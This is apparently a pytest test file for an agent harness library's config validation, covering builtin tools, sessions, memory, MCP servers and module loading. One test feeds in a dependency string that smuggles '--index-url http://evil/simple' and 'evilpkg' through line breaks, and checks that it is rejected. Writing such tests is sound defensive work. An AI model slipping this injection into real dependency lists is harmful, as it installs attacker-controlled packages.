import inspect
import logging
import math
import sys
from pathlib import Path
from types import ModuleType
from typing import get_args

import pytest

from strands_harness import (
    DEFAULT_HARNESS_AGENT_CONFIG,
    create_harness,
    define_harness_agent_config,
    harness_agent_kwargs_from_config,
    normalize_harness_agent_config,
)
from strands_harness.config import _BUILTIN_TOOL_CONFIGS, _BuiltinToolsMap
from strands_harness.options import (
    _BUILTIN_TOOL_CONFIG_KEYS,
    _check_builtin_tool_config_value,
    _normalize_builtin_tools,
)
from strands_harness.types.agent import BuiltinToolName


def test_config_round_trips_complete_definition():
    config = define_harness_agent_config(
        {
            "name": "Reviewer",
            "description": "Reviews changes",
            "instructions": "Be strict.",
            "effort": "high",
            "builtinTools": {"web_search": False, "web_fetch": {"model": "openai/gpt-5-mini"}},
            "caching": False,
            "contextManager": "agentic",
            "session": {"id": "review", "dir": "./sessions"},
            "skills": ["./skills", "https://example.com/skills.git"],
            "memory": {"dir": "./memory"},
            "interventions": "ask",
            "modelModule": {"kind": "model", "module": "custom_model", "export": "model"},
            "interventionModules": [{"kind": "intervention", "module": "custom_policy", "export": "policy"}],
            "agentConfigModules": {
                "callback_handler": {
                    "kind": "agent-config",
                    "module": "callbacks",
                    "export": "callback_handler",
                }
            },
            "dependencies": {"typescript": {"package": "^1"}, "python": ["package>=1"]},
            "agentConfig": {"max_parallel_tools": 2},
        }
    )

    assert normalize_harness_agent_config(config) == config


def test_config_warns_about_unknown_keys_and_drops_them(caplog):
    with caplog.at_level(logging.WARNING, logger="strands_harness.config"):
        config = normalize_harness_agent_config({"builtinTool": ["shell"], "extra": 1})

    assert "builtinTool" not in config
    assert "extra" not in config
    assert "Ignoring unknown agent config keys: builtinTool, extra." in caplog.text


@pytest.mark.parametrize(
    "key",
    [
        "thinking",
        "webFetchModel",
        "webFetchModelModule",
        "contextManagement",
        "sessionId",
        "sessionDir",
        "skillsDir",
        "memoryDir",
        "memoryManager",
    ],
)
def test_config_retired_keys_are_plain_unknown_keys(key, caplog):
    """The library carries no shim: a pre-rename key is dropped with the generic warning.

    Rewriting stored profiles is the CLI's job (it owns the on-load migration)."""
    with caplog.at_level(logging.WARNING, logger="strands_harness.config"):
        config = normalize_harness_agent_config({key: "x"})

    assert key not in config
    assert config == normalize_harness_agent_config({})
    assert f"Ignoring unknown agent config keys: {key}." in caplog.text


def test_config_defaults_missing_dependency_halves():
    config = normalize_harness_agent_config({"dependencies": {"typescript": {"pkg": "^1.0.0"}}})

    assert config["dependencies"] == {"typescript": {"pkg": "^1.0.0"}, "python": []}
    assert normalize_harness_agent_config({"dependencies": {"python": ["requests>=2"]}})["dependencies"] == {
        "typescript": {},
        "python": ["requests>=2"],
    }


def test_config_rejects_python_dependency_line_breaks():
    with pytest.raises(ValueError, match="line breaks"):
        normalize_harness_agent_config(
            {"dependencies": {"python": ["requests\n--index-url http://evil/simple\nevilpkg"]}}
        )


@pytest.mark.parametrize("dependency", [None, "", "  "])
def test_config_module_ref_dependency_is_optional_not_nullable(dependency):
    with pytest.raises(ValueError, match="tools.0.dependency: Input should be a"):
        normalize_harness_agent_config({"tools": [{"module": "./tools.py", "dependency": dependency}]})


def test_config_maps_to_harness_agent_kwargs(tmp_path):
    kwargs = harness_agent_kwargs_from_config(DEFAULT_HARNESS_AGENT_CONFIG, tmp_path)

    assert kwargs == {
        "name": "Strands harness",
        "model": DEFAULT_HARNESS_AGENT_CONFIG["model"],
        "effort": "auto",
        "context_manager": "auto",
        "session": True,
        "skills": True,
        "memory": True,
    }


def test_config_every_create_harness_parameter_has_a_bridge_key_or_is_factory_only():
    """§4: each ``create_harness`` parameter is reachable from JSON or deliberately code-only."""
    factory_only = {"tools", "mcp_servers", "plugins", "background_tasks"}
    bridged = {
        "instructions": "instructions",
        "model": "model",
        "effort": "effort",
        "builtin_tools": "builtinTools",
        "caching": "caching",
        "context_manager": "contextManager",
        "session": "session",
        "skills": "skills",
        "memory": "memory",
        "builtin_plugins": "builtinPlugins",
        "interventions": "interventions",
    }
    params = {
        name
        for name, parameter in inspect.signature(create_harness).parameters.items()
        if parameter.kind is not inspect.Parameter.VAR_KEYWORD
    }
    assert params == set(bridged) | factory_only
    assert set(bridged.values()) <= set(DEFAULT_HARNESS_AGENT_CONFIG)
    # Factory-only parameters and SDK passthrough (``name``, ``sandbox``, ...) are still fed by module
    # references or ``agentConfig``, never by a dead key.
    assert {"tools", "plugins", "mcpServers", "name", "description", "sandbox", "agentConfig"} <= set(
        DEFAULT_HARNESS_AGENT_CONFIG
    )


def test_config_forwards_session_off(tmp_path):
    config = define_harness_agent_config({"session": False})
    kwargs = harness_agent_kwargs_from_config(config, tmp_path)
    assert kwargs["session"] is False


def test_config_resolves_session_and_memory_dirs_against_the_project_root(tmp_path):
    config = define_harness_agent_config({"session": {"id": "run", "dir": "./runs"}, "memory": {"dir": "mem"}})
    kwargs = harness_agent_kwargs_from_config(config, tmp_path)
    assert kwargs["session"] == {"id": "run", "dir": str(tmp_path / "runs")}
    assert kwargs["memory"] == {"dir": str(tmp_path / "mem")}


def test_config_folds_memory_stores_into_the_memory_config(tmp_path):
    module = tmp_path / "stores.py"
    module.write_text("store = object()\n")
    reference = {"kind": "memory-store", "module": str(module), "export": "store", "language": "python"}
    kwargs = harness_agent_kwargs_from_config(define_harness_agent_config({"memoryStores": [reference]}), tmp_path)
    assert len(kwargs["memory"]["stores"]) == 1
    assert "dir" not in kwargs["memory"]

    off = define_harness_agent_config({"memory": False, "memoryStores": [reference]})
    assert harness_agent_kwargs_from_config(off, tmp_path)["memory"] is False


def test_config_resolves_relative_skills_and_leaves_urls_alone(tmp_path):
    single = harness_agent_kwargs_from_config(define_harness_agent_config({"skills": "./skills"}), tmp_path)
    assert single["skills"] == str(tmp_path / "skills")
    many = harness_agent_kwargs_from_config(
        define_harness_agent_config({"skills": ["skills", "https://example.com/skills.git"]}), tmp_path
    )
    assert many["skills"] == [str(tmp_path / "skills"), "https://example.com/skills.git"]
    assert harness_agent_kwargs_from_config(define_harness_agent_config({"skills": False}), tmp_path)["skills"] is False


@pytest.mark.parametrize("value", ["", ["ok", 3], {"dir": "x"}])
def test_config_rejects_malformed_skills(value):
    with pytest.raises(ValueError, match="skills"):
        normalize_harness_agent_config({"skills": value})


def test_config_builtin_tools_list_replaces_and_default_list_is_omitted(tmp_path):
    default = harness_agent_kwargs_from_config(
        define_harness_agent_config({"builtinTools": list(DEFAULT_HARNESS_AGENT_CONFIG["builtinTools"])}), tmp_path
    )
    assert "builtin_tools" not in default
    pinned = harness_agent_kwargs_from_config(define_harness_agent_config({"builtinTools": ["shell"]}), tmp_path)
    assert pinned["builtin_tools"] == ["shell"]


def test_config_builtin_tools_mapping_passes_edits_and_loads_web_fetch_model(tmp_path):
    module = tmp_path / "models.py"
    module.write_text("model = object()\n")
    config = define_harness_agent_config(
        {
            "builtinTools": {
                "web_search": False,
                "web_fetch": {
                    "model": {"kind": "model", "module": str(module), "export": "model", "language": "python"}
                },
            }
        }
    )
    assert config["builtinTools"]["web_fetch"]["model"]["export"] == "model"
    kwargs = harness_agent_kwargs_from_config(config, tmp_path)
    assert kwargs["builtin_tools"]["web_search"] is False
    assert kwargs["builtin_tools"]["web_fetch"]["model"] is not None
    assert not isinstance(kwargs["builtin_tools"]["web_fetch"]["model"], dict)


def test_config_builtin_tools_web_fetch_transport_passes_through_and_is_validated():
    config = normalize_harness_agent_config({"builtinTools": {"web_fetch": {"transport": "direct"}}})
    assert config["builtinTools"]["web_fetch"] == {"transport": "direct"}
    with pytest.raises(ValueError, match="transport"):
        normalize_harness_agent_config({"builtinTools": {"web_fetch": {"transport": "wget"}}})


def test_config_builtin_tools_mapping_normalizes_bare_web_fetch():
    config = normalize_harness_agent_config({"builtinTools": {"*": False, "web_fetch": {}}})
    assert config["builtinTools"] == {"*": False, "web_fetch": {}}


@pytest.mark.parametrize(
    ("name", "setting", "expected"),
    [
        ("shell", {"description": "Run things"}, {"description": "Run things"}),
        ("web_fetch", {"model": "openai/gpt-5-mini"}, {"model": "openai/gpt-5-mini"}),
        (
            "programmatic_tool_caller",
            {"allowedTools": ["read", "shell"], "timeout": 2.5},
            {"allowed_tools": ["read", "shell"], "timeout": 2.5},
        ),
        ("programmatic_tool_caller", {"allowedTools": None, "timeout": None}, {"allowed_tools": None, "timeout": None}),
        ("subagent", {"maxDepth": 0}, {"max_depth": 0}),
    ],
)
def test_config_builtin_tools_object_translates_to_snake_case_kwarg(name, setting, expected, tmp_path):
    config = define_harness_agent_config({"builtinTools": {name: setting}})
    assert config["builtinTools"] == {name: setting}
    assert harness_agent_kwargs_from_config(config, tmp_path)["builtin_tools"] == {name: expected}


@pytest.mark.parametrize(
    ("value", "message"),
    [
        (["nope"], "builtinTools"),
        (["read", "read"], "builtinTools: List items should be unique"),
        ({"nope": True}, "builtinTools.nope: Extra inputs are not permitted"),
        ({"read": {"model": "x"}}, "builtinTools.read: Input should be a valid boolean"),
        ({"shell": {"model": "x"}}, "builtinTools.shell.model: Extra inputs are not permitted"),
        ({"shell": {"description": ""}}, "builtinTools.shell.description: Input should be a non-empty string"),
        ({"shell": {"description": None}}, "builtinTools.shell.description: Input should be a valid string"),
        ({"web_fetch": {"model": ""}}, "builtinTools.web_fetch.model: Input should be a non-empty string"),
        ({"web_fetch": {"model": {"module": ""}}}, "builtinTools.web_fetch.model.module: Input should be a non-empty"),
        ({"web_fetch": {"model": {"kind": "tool", "module": "m"}}}, "web_fetch.model: Input should be 'model'"),
        (
            {"web_fetch": {"model": 3}},
            "web_fetch.model: Input should be a non-empty string or a model module reference",
        ),
        (
            {"web_fetch": {"model": None}},
            "web_fetch.model: Input should be a non-empty string or a model module reference",
        ),
        ({"programmatic_tool_caller": {"allowedTools": [""]}}, "allowedTools.0: Input should be a non-empty string"),
        ({"web_fetch": 1}, "builtinTools.web_fetch: Input should be a boolean or an object with optional model"),
        ({"programmatic_tool_caller": {"allowedTools": "read"}}, "allowedTools: Input should be a valid list"),
        ({"programmatic_tool_caller": {"allowedTools": [1]}}, "allowedTools.0: Input should be a valid string"),
        ({"programmatic_tool_caller": {"timeout": 0}}, "timeout: Input should be a positive number or null"),
        ({"programmatic_tool_caller": {"timeout": True}}, "timeout: Input should be a positive number or null"),
        ({"programmatic_tool_caller": {"timeout": "1"}}, "timeout: Input should be a positive number or null"),
        ({"subagent": {"maxDepth": -1}}, "subagent.maxDepth: Input should be greater than or equal to 0"),
        ({"subagent": {"maxDepth": 1.5}}, "subagent.maxDepth: Input should be a valid integer"),
        ({"subagent": {"maxDepth": True}}, "subagent.maxDepth: Input should be a valid integer"),
        ("shell", "builtinTools: Input should be an array of tool names or an object of per-tool settings"),
    ],
)
def test_config_rejects_malformed_builtin_tools(value, message):
    with pytest.raises(ValueError, match=message):
        normalize_harness_agent_config({"builtinTools": value})


@pytest.mark.parametrize(
    ("value", "expected"),
    [("auto", "auto"), ("agentic", "agentic"), ("off", False), (False, False), ({"stash": False}, {"stash": False})],
)
def test_config_context_manager_passes_through_and_maps_off(value, expected, tmp_path):
    assert normalize_harness_agent_config({"contextManager": value})["contextManager"] == expected
    kwargs = harness_agent_kwargs_from_config(define_harness_agent_config({"contextManager": value}), tmp_path)
    assert kwargs["context_manager"] == expected


@pytest.mark.parametrize(
    ("value", "message"),
    [
        (True, "contextManager: Input should be one of 'auto', 'agentic', 'off'; false; or a config object"),
        ("turbo", "contextManager: Input should be 'auto', 'agentic' or 'off'"),
        (3, "contextManager: Input should be one of 'auto', 'agentic', 'off'; false; or a config object"),
        (0, "contextManager: Input should be one of"),
        ({"stash": float("nan")}, "contextManager.stash: Input should be a finite number"),
    ],
)
def test_config_rejects_malformed_context_manager(value, message):
    with pytest.raises(ValueError, match=message):
        normalize_harness_agent_config({"contextManager": value})


@pytest.mark.parametrize(
    ("key", "value", "message"),
    [
        ("session", "auto", "session: Input should be a boolean or an object with optional id and dir"),
        ("session", {"id": ""}, "session.id: Input should be a non-empty string"),
        ("session", {"id": None}, "session.id: Input should be a valid string"),
        ("session", {"path": "x"}, "session.path: Extra inputs are not permitted"),
        ("memory", "auto", "memory: Input should be a boolean or an object with an optional dir"),
        ("memory", {"dir": 3}, "memory.dir: Input should be a valid string"),
        ("memory", {"stores": []}, "memory.stores: Extra inputs are not permitted"),
    ],
)
def test_config_rejects_malformed_session_and_memory(key, value, message):
    with pytest.raises(ValueError, match=message):
        normalize_harness_agent_config({key: value})


def test_config_effort_passes_through_verbatim(tmp_path):
    kwargs = harness_agent_kwargs_from_config(define_harness_agent_config({"effort": "xhigh"}), tmp_path)
    assert kwargs["effort"] == "xhigh"


def test_config_rejects_typescript_references():
    config = define_harness_agent_config(
        {
            "tools": [
                {
                    "kind": "tool",
                    "module": "./tool.ts",
                    "language": "typescript",
                    "files": ["./tool.ts"],
                }
            ]
        }
    )

    with pytest.raises(ValueError, match="Cannot load TypeScript module"):
        harness_agent_kwargs_from_config(config)


def test_config_loads_executable_module_references(tmp_path):
    module = tmp_path / "values.py"
    module.write_text(
        "custom_tool = object()\n"
        "custom_intervention = object()\n"
        "def callback_handler(*args, **kwargs):\n"
        "    return None\n"
    )
    config = define_harness_agent_config(
        {
            "tools": [{"kind": "tool", "module": str(module), "export": "custom_tool", "language": "python"}],
            "interventions": ["ask", "./policy.cedar"],
            "interventionModules": [
                {
                    "kind": "intervention",
                    "module": str(module),
                    "export": "custom_intervention",
                    "language": "python",
                }
            ],
            "agentConfigModules": {
                "callback_handler": {
                    "kind": "agent-config",
                    "module": str(module),
                    "export": "callback_handler",
                    "language": "python",
                }
            },
        }
    )

    kwargs = harness_agent_kwargs_from_config(config, tmp_path)
    assert len(kwargs["tools"]) == 1
    assert callable(kwargs["callback_handler"])
    assert kwargs["interventions"][:2] == ["ask", str(tmp_path / "policy.cedar")]
    assert len(kwargs["interventions"]) == 3


def test_config_registers_and_reuses_local_dataclass_modules(tmp_path):
    (tmp_path / "tool.py").write_text(
        "from __future__ import annotations\n"
        "from dataclasses import dataclass\n"
        "@dataclass\n"
        "class Tool:\n"
        "    name: str = 'custom-tool'\n"
        "default = Tool()\n"
    )
    config = define_harness_agent_config({"tools": [{"kind": "tool", "module": "./tool.py"}]})

    tool = harness_agent_kwargs_from_config(config, tmp_path)["tools"][0]

    assert tool.name == "custom-tool"
    assert sys.modules[type(tool).__module__].default is tool
    assert harness_agent_kwargs_from_config(config, tmp_path)["tools"][0] is tool


@pytest.mark.parametrize(
    "module",
    ["./package/nested/tool.py", "./package/nested/__init__.py", "./package/__init__.py", "./package"],
)
def test_config_loads_packaged_relative_imports(tmp_path, module):
    package = tmp_path / "package"
    (package / "nested").mkdir(parents=True)
    (package / "__init__.py").write_text("prefix = 'project'\nfrom .nested import default\n")
    (package / "helper.py").write_text("from . import prefix\nname = prefix + '-tool'\n")
    (package / "nested" / "__init__.py").write_text("suffix = 'loaded'\nfrom .tool import default\n")
    (package / "nested" / "tool.py").write_text(
        "from __future__ import annotations\n"
        "from dataclasses import dataclass\n"
        "from ..helper import name\n"
        "from . import suffix\n"
        "@dataclass\n"
        "class Tool:\n"
        "    name: str\n"
        "default = Tool(name + '-' + suffix)\n"
    )
    config = define_harness_agent_config(
        {
            "tools": [
                {
                    "kind": "tool",
                    "module": module,
                    "files": [
                        "./package/__init__.py",
                        "./package/helper.py",
                        "./package/nested/__init__.py",
                        "./package/nested/tool.py",
                    ],
                }
            ]
        }
    )
    original_path = sys.path.copy()

    tool = harness_agent_kwargs_from_config(config, tmp_path)["tools"][0]

    assert tool.name == "project-tool-loaded"
    assert sys.modules[type(tool).__module__].default is tool
    assert sys.path == original_path


def test_config_isolates_same_named_local_packages(tmp_path, monkeypatch):
    existing = ModuleType("shared")
    monkeypatch.setitem(sys.modules, "shared", existing)
    config = define_harness_agent_config({"tools": [{"kind": "tool", "module": "./shared/tool.py"}]})
    tools = []
    for name in ("first", "second"):
        root = tmp_path / name
        package = root / "shared"
        package.mkdir(parents=True)
        (package / "__init__.py").write_text(f"name = {name!r}\n")
        (package / "tool.py").write_text("from . import name\ndefault = name\n")
        tools.extend(harness_agent_kwargs_from_config(config, root)["tools"])

    assert tools == ["first", "second"]
    assert sys.modules["shared"] is existing


def test_config_removes_failed_module_registration(tmp_path):
    module = tmp_path / "tool.py"
    module.write_text("raise RuntimeError('module failed')\n")
    config = define_harness_agent_config({"tools": [{"kind": "tool", "module": "./tool.py"}]})

    with pytest.raises(RuntimeError, match="module failed"):
        harness_agent_kwargs_from_config(config, tmp_path)

    module.write_text("default = 'loaded'\n")
    assert harness_agent_kwargs_from_config(config, tmp_path)["tools"] == ["loaded"]


def test_config_does_not_add_flat_siblings_to_the_import_path(tmp_path):
    (tmp_path / "strands_config_flat_helper.py").write_text("default = 'helper'\n")
    (tmp_path / "tool.py").write_text("from strands_config_flat_helper import default\n")
    config = define_harness_agent_config({"tools": [{"kind": "tool", "module": "./tool.py"}]})
    original_path = sys.path.copy()

    with pytest.raises(ModuleNotFoundError, match="strands_config_flat_helper"):
        harness_agent_kwargs_from_config(config, tmp_path)

    assert sys.path == original_path


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("./policy.cedar", "/project/policy.cedar"),
        ("policies/policy.cedar", "/project/policies/policy.cedar"),
        ("  ./policy.cedar  ", "/project/policy.cedar"),
        ("/policies/policy.cedar", "/policies/policy.cedar"),
        ("~/policy.cedar", str(Path.home() / "policy.cedar")),
        ("ask", "ask"),
        ("  Require approval for writes.  ", "  Require approval for writes.  "),
        ("./policy.cedar.bak", "./policy.cedar.bak"),
    ],
)
def test_config_resolves_cedar_interventions_against_project_root(value, expected):
    config = define_harness_agent_config({"interventions": value})

    kwargs = harness_agent_kwargs_from_config(config, "/project")

    assert kwargs["interventions"] == expected
    assert config["interventions"] == value


def test_config_expands_portable_mcp_environment_placeholders(monkeypatch):
    monkeypatch.setenv("MCP_TOKEN", "secret")
    monkeypatch.setenv("mcpClient", "client")
    config = define_harness_agent_config(
        {
            "mcpServers": {
                "private": {
                    "url": "https://example.com/mcp",
                    "headers": {
                        "Authorization": "Bearer ${MCP_TOKEN}",
                        "X-Client": "${env:mcpClient}",
                    },
                    "continueOnError": True,
                }
            }
        }
    )

    kwargs = harness_agent_kwargs_from_config(config)
    assert kwargs["mcp_servers"]["private"]["headers"]["Authorization"] == "Bearer secret"
    assert kwargs["mcp_servers"]["private"]["headers"]["X-Client"] == "client"
    assert kwargs["mcp_servers"]["private"]["continue_on_error"] is True


def test_config_rejects_missing_mcp_environment_variable(monkeypatch):
    monkeypatch.delenv("missingToken", raising=False)
    config = define_harness_agent_config(
        {
            "mcpServers": {
                "private": {
                    "url": "https://example.com/mcp",
                    "headers": {"Authorization": "Bearer ${env:missingToken}"},
                }
            }
        }
    )

    with pytest.raises(ValueError, match=r'Environment variable "missingToken" is not set\.'):
        harness_agent_kwargs_from_config(config)


def test_config_loads_file_backed_mcp_config(tmp_path, monkeypatch):
    monkeypatch.setenv("MCP_TOKEN", "secret")
    (tmp_path / "mcp.json").write_text(
        '{"mcpServers":{"private":{"url":"https://example.com/mcp","headers":{"Authorization":"Bearer ${MCP_TOKEN}"}}}}'
    )
    config = define_harness_agent_config({"mcpServers": "./mcp.json"})

    kwargs = harness_agent_kwargs_from_config(config, tmp_path)

    assert kwargs["mcp_servers"]["private"]["headers"]["Authorization"] == "Bearer secret"


def test_config_rejects_missing_module():
    with pytest.raises(ValueError, match="tools.0.module: Field required"):
        normalize_harness_agent_config({**DEFAULT_HARNESS_AGENT_CONFIG, "tools": [{"kind": "tool"}]})


@pytest.mark.parametrize(
    ("key", "value", "message"),
    [
        ("name", "", "name: Input should be a non-empty string"),
        ("description", None, "description: Input should be a valid string"),
        (
            "effort",
            "turbo",
            "effort: Input should be 'auto', 'off', 'minimal', 'low', 'medium', 'high', 'xhigh' or 'max'",
        ),
        ("caching", "yes", "caching: Input should be a valid boolean"),
        ("tools", [{"kind": "plugin", "module": "m"}], "tools.0: Input should be 'tool'"),
        ("tools", [{"kind": None, "module": "m"}], "tools.0: Input should be 'tool'"),
        ("tools", ["m"], "tools.0: Input should be a module reference object"),
        # Aligns with harness-ts: a non-string ``export`` fails at validation instead of later in ``_load_reference``.
        ("tools", [{"module": "./m.py", "export": 5}], "tools.0.export: Input should be a valid string"),
        ("tools", [{"module": "m", "language": "rust"}], "tools.0.language: Input should be 'python' or 'typescript'"),
        ("tools", [{"module": "m", "files": [""]}], "tools.0.files.0: Input should be a non-empty string"),
        ("tools", [{"module": "m", "extra": object()}], "tools.0.extra: "),
        ("modelModule", "openai", "modelModule: Input should be a module reference object"),
        ("mcpServers", 3, "mcpServers: Input should be an object or a non-empty file path"),
        ("mcpServers", "", "mcpServers: Input should be an object or a non-empty file path"),
        ("mcpServers", {"x": object()}, "mcpServers.x: "),
        ("skills", ["a", "a"], "skills: List items should be unique"),
        ("builtinPlugins", ["todos", "todos"], "builtinPlugins: List items should be unique"),
        ("builtinPlugins", ["nope"], "builtinPlugins.0: Input should be 'todos' or 'environment'"),
        ("interventions", [""], "interventions.0: Input should be a non-empty string"),
        # Aligns with harness-ts: a blank string is not "no interventions"; use null for that.
        ("interventions", "", "interventions: Input should be a non-empty string"),
        ("interventions", 3, "interventions: Input should be a string, an array of strings, or null"),
        ("sandbox", {"kind": "tool", "module": "m"}, "sandbox: Input should be 'sandbox'"),
        (
            "agentConfigModules",
            {"x": {"kind": "tool", "module": "m"}},
            "agentConfigModules.x: Input should be 'agent-config'",
        ),
        ("dependencies", {"python": ["a", "a"]}, "dependencies.python: List items should be unique"),
        ("dependencies", {"typescript": {"": "1"}}, "dependencies.typescript: Object keys should be non-empty strings"),
        (
            "dependencies",
            {"typescript": {" ": "1"}},
            "dependencies.typescript: Object keys should be non-empty strings",
        ),
        (
            "agentConfigModules",
            {"": {"module": "m"}},
            "agentConfigModules: Object keys should be non-empty strings, got ''",
        ),
        ("agentConfigModules", {"\t": {"module": "m"}}, "agentConfigModules: Object keys should be non-empty strings"),
        ("tools", [{"module": "m", "export": ""}], "tools.0.export: Input should be a non-empty string"),
        ("tools", [{"module": "m", "export": None}], "tools.0.export: Input should be a valid string"),
        ("tools", [{"module": "m", "language": None}], "tools.0.language: Input should be 'python' or 'typescript'"),
        ("tools", [{"module": "m", "files": None}], "tools.0.files: Input should be a valid list"),
        ("agentConfig", {"x": float("inf")}, "agentConfig.x: Input should be a finite number"),
        ("agentConfig", {"x": object()}, "agentConfig.x: "),
        ("agentConfig", {"x": {"y": object()}}, "agentConfig.x.y: "),
        ("agentConfig", {"x": [1, object()]}, "agentConfig.x.1: "),
    ],
)
def test_config_rejects_malformed_values(key, value, message):
    with pytest.raises(ValueError, match=message):
        normalize_harness_agent_config({key: value})


def test_config_reports_every_problem_on_its_own_line():
    with pytest.raises(ValueError) as info:
        normalize_harness_agent_config({"name": "", "session": {"id": "", "path": "x"}})

    assert str(info.value).splitlines() == [
        "name: Input should be a non-empty string",
        "session.id: Input should be a non-empty string",
        "session.path: Extra inputs are not permitted",
    ]


def test_config_module_references_keep_extra_keys_and_int_settings_stay_ints():
    config = normalize_harness_agent_config(
        {
            "tools": [
                {"module": "./tools.py", "export": "search", "weird": {"nested": [1, "two"]}},
                {"module": "./bundle.py", "files": []},
            ],
            "builtinTools": {"programmatic_tool_caller": {"timeout": 2}},
        }
    )

    assert config["tools"] == [
        {"kind": "tool", "module": "./tools.py", "export": "search", "weird": {"nested": [1, "two"]}},
        {"kind": "tool", "module": "./bundle.py", "files": []},
    ]
    assert config["builtinTools"] == {"programmatic_tool_caller": {"timeout": 2}}
    assert type(config["builtinTools"]["programmatic_tool_caller"]["timeout"]) is int


@pytest.mark.parametrize(
    ("name", "key", "camel", "value"),
    [
        ("shell", "description", "description", ""),
        ("shell", "description", "description", "  "),
        ("shell", "description", "description", 3),
        ("web_fetch", "model", "model", ""),
        ("web_fetch", "model", "model", 3),
        ("programmatic_tool_caller", "allowed_tools", "allowedTools", "read"),
        ("programmatic_tool_caller", "allowed_tools", "allowedTools", [1]),
        ("programmatic_tool_caller", "allowed_tools", "allowedTools", [""]),
        ("programmatic_tool_caller", "timeout", "timeout", 0),
        ("programmatic_tool_caller", "timeout", "timeout", -1.5),
        ("programmatic_tool_caller", "timeout", "timeout", math.inf),
        ("programmatic_tool_caller", "timeout", "timeout", True),
        ("programmatic_tool_caller", "timeout", "timeout", "1"),
        ("subagent", "max_depth", "maxDepth", -1),
        ("subagent", "max_depth", "maxDepth", 1.5),
        ("subagent", "max_depth", "maxDepth", True),
        ("subagent", "max_depth", "maxDepth", "2"),
    ],
)
def test_config_and_kwargs_paths_reject_the_same_builtin_tool_config_values(name, key, camel, value):
    with pytest.raises(ValueError, match=f"builtinTools.{name}.{camel}"):
        normalize_harness_agent_config({"builtinTools": {name: {camel: value}}})
    with pytest.raises(ValueError, match=rf"builtin_tools\['{name}'\]\['{key}'\] must be"):
        _normalize_builtin_tools({name: {key: value}})


def test_every_builtin_tool_config_key_has_a_kwargs_check():
    """The per-key table in ``_check_builtin_tool_config_value`` covers every key a config dict can carry:
    a new key drifts here as a ``KeyError`` rather than reaching a factory unchecked."""
    for tool, keys in _BUILTIN_TOOL_CONFIG_KEYS.items():
        for key in keys:
            with pytest.raises(ValueError, match=rf"builtin_tools\['{tool}'\]\['{key}'\] must be"):
                _check_builtin_tool_config_value(tool, key, object())


def test_config_builtin_tool_models_match_the_typed_dicts_options_accepts():
    assert set(_BUILTIN_TOOL_CONFIGS) == set(_BUILTIN_TOOL_CONFIG_KEYS)
    for name, model in _BUILTIN_TOOL_CONFIGS.items():
        assert set(model.model_fields) == _BUILTIN_TOOL_CONFIG_KEYS[name]
    assert set(_BuiltinToolsMap.model_fields) - {"all_tools"} == set(get_args(BuiltinToolName))


def test_config_builtin_tools_web_search_is_a_bool_or_exa(tmp_path):
    config = define_harness_agent_config({"builtinTools": {"web_search": "exa"}})
    assert harness_agent_kwargs_from_config(config, tmp_path)["builtin_tools"]["web_search"] == "exa"
    with pytest.raises(ValueError, match="builtinTools.web_search: Input should be a boolean or 'exa'"):
        define_harness_agent_config({"builtinTools": {"web_search": "bing"}})
    with pytest.raises(ValueError, match="builtinTools.web_search: Input should be a boolean or 'exa'"):
        define_harness_agent_config({"builtinTools": {"web_search": {"fallback": "exa"}}})
